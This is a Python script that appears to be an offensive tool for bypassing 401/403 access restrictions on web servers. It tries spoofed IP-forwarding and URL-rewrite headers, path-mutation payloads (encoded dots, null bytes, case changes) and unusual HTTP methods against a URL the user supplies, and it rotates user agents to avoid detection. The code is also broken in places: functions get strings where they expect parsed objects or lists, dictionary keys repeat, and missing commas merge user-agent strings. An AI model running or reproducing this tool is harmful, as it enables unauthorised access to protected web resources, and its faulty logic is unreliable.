import requests
from urllib.parse import urlparse
import eventlet
from random import randint

urlPayloads = ['~', '.', ';', '*', '*/', '#', '?', '/', '/.', '' '//', '%09', '%20', '%5C', '%23', '%00', '%2e/', './']
extensions = ['.php', '.html', '.json']
IPs = ['192.168.1.0', '192.168.1.1', '10.0.0.0', '10.1.1.1', '172.16.0.0', '172.16.1.1', '192.168.0.0', '127.0.0.1', 'http://127.0.0.1', '127.0.1', '127.1', '127.000.000.001', '::1', '0000::1', '0177.0.0.01', '0x7f.0x0.0x0.0x1', '0x7f000001', '0x885aed3a587f000001', '281472812449793', '0x7f.0.0.0x1', '::ffff:7f00:0001', "localhost", "localhost:80", "localhost:443", "127.0.0.1:80", "127.0.0.1:443", "2130706433", "0x7F000001", "0177.0000.0000.0001", "0", "10.0.0.1", "172.16.0.1"]
Custom_Headers = {'X-Forwarded-Port': '443', 'X-Forwarded-Port': '4443', 'X-Forwarded-Port': '80', 'X-Forwarded-Port': '8080', 'X-Forwarded-Port': '8443', 'X-Forwarded-Proto': 'http', 'X-Forwarded-Proto': 'https', 'X-Forwarded-Scheme': 'http', 'X-Forwarded-Scheme': 'https', 'Request-ID': '1234567890', 'Max-Forwards': '0', 'Max-Forwards': '1', 'Max-Forwards': '2'}
IP_headers = ['X-Originating-IP', 'X-Forwarded-For', 'X-Forwarded', 'Forwarded', 'X-Real-IP', 'Via','Forwarded-For', 'X-Forwarded-Server','X-Requested-For','X-Requested-By','X-Trusted-IP', 'X-Remote-IP','X-Remote-Addr','X-ProxyUser-Ip','X-Original-URL','Client-IP','True-Client-IP','Cluster-Client-IP','X-ProxyUser-Ip','Host', 'X-Custom-IP-Authorization', 'X-Forwarded-Host']
URL_Header = ['Proxy-Url', 'Referer', 'Referer', 'Referer', 'Url', 'Url', 'X-Proxy-Url']
user_agents = [
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone14,6; U; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19E241 Safari/602.1",
    "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1",
    "Mozilla/5.0 (Linux; Android 13; SM-A536U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1",
    "Opera/9.80 (Windows NT 6.0; U; en) Presto/2.2.15 Version/10.00"
    "Opera/9.80 (Windows NT 6.0; U; en) Presto/2.2.15 Version/10.10"
    "Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15"
    "Opera/9.51 (Windows NT 5.1; U; es-LA)"
    "Opera/9.52 (Windows NT 6.0; U; Opera/9.52 (X11; Linux x86_64; U); en)"
    "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-GB; rv:1.8.1.13) Gecko/20080311 Firefox/2.0.0.13"
    "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-GB; rv:1.8.1.20) Gecko/20081217 Firefox/2.0.0.20"
    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; es-es) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27"
    "Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_4_11; fr) AppleWebKit/525.18 (KHTML, like Gecko) Version/3.1.2 Safari/525.22"
    "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
]
length = len(user_agents)

class urlParse():
    def __init__(self, url):
        self.url = url
        self.parsed_url = urlparse(url)

    def capitalise(self, sub_path):
        return sub_path.capitalize()
    
    def Upper(self, sub_path):
        return sub_path.upper()
    
    def host(self):
        return self.parsed_url.netloc
    
    def path(self):
        return self.parsed_url.path
    
    def splitted_path(self):
        return self.parsed_url.path.strip('/').split('/')
    
    def query(self):
        return self.parsed_url.query
    
    def replace(self, pattern_to_be_replaced, pattern_to_replace):
        return self.url.replace(pattern_to_be_replaced, pattern_to_replace)


def do_request(urls, headers=None):
    for url in urls:
        with eventlet.Timeout(0.1): # stable connection
            try:
                response = requests.get(url, headers=headers)
                if response.status_code >= 200 and response.status_code < 300:  # OK
                    print(f"vulnerable to 403 bypass, just use payload: {url}")
                elif (response.status_code >= 300 and response.status_code < 400): # redirects
                    print(f"may be vulnerable to 403 bypass, just use payload: {url}")
            except:
                pass

def check_wayback(url):
    url = f"https://archive.org/wayback/available?url={url}"
    response = requests.get(url)
    if response.status_code == 200:
        data = response.json()
        # Extract the URL snapshot from the response
        closest_snapshot = data['archived_snapshots'].get('closest')
        if closest_snapshot:
            snapshot_url = closest_snapshot.get('url')
            print(f"Snapshot URL: {snapshot_url}")
        else:
            print("[!] No available wayback snapshots, Bye!!!!")
    else:
        print("Failed to fetch data from Wayback Machine")


# Preparing header_payloads
def make_header_payloads(URL: urlParse):    
    header_payloads = [
    {'X-Original-URL': URL.path(),
    'X-Rewrite-URL': URL.path(),
    'Content-Length' : 0}
    ]

    header_payloads.append(Custom_Headers)

    for IP_H in IP_headers:
        for value in IPs:
            header_payloads.append({IP_H: value})

    for URL_H in URL_Header:
        header_payloads.append({URL_H: URL.url})
    return header_payloads


# Preparing path_payloads
def make_path_payloads(URL: urlParse):
    path_payloads = []
    for sub_path in URL.splitted_path():
        path_payloads.append(URL.replace(sub_path, URL.capitalise(sub_path)))
        path_payloads.append(URL.replace(sub_path, URL.Upper(sub_path)))
        if '.' not in sub_path:
            for extension in extensions:
                path_payloads.append(URL.replace(sub_path, sub_path + extension))
        
    for addon in urlPayloads:
        for sub_path in URL.splitted_path():    
            path_payloads.append(URL.replace(sub_path, sub_path + addon))
            path_payloads.append(URL.replace(sub_path, addon + sub_path))
    return path_payloads


# Trying various http methods
def try_various_methods(URL: urlParse):
    methods = ['head', 'delete', 'options', 'patch', 'put', 'connect', 'trace', 'foo']
    for method in methods:
        try:
            response = requests.request(method, URL.url, headers={"User-Agent":user_agents[randint(0, length-1)]})
            if response.status_code >= 200 and response.status_code < 300:  # OK
                print(f"vulnerable to 403 bypass, just use method: {method}")
            elif (response.status_code >= 300 and response.status_code < 400): # redirects
                print(f"may be vulnerable to 403 bypass, just use method: {method}")
        except:
            pass


if __name__ == '__main__':
    URL = urlParse(input("URL: "))
    response = requests.get(URL.url)
    if response.status_code in (401, 403):
        try_various_methods(URL.url)
        header_payloads = make_header_payloads(URL)
        path_payloads = make_path_payloads(URL)
        for header in header_payloads:
            for key, value in header.items():
                do_request(URL.url, {"User-Agent":user_agents[randint(0, length-1)], key:value})
        for payload in path_payloads:
            do_request(payload, {"User-Agent":user_agents[randint(0, length-1)]})
        check_wayback(URL.url)


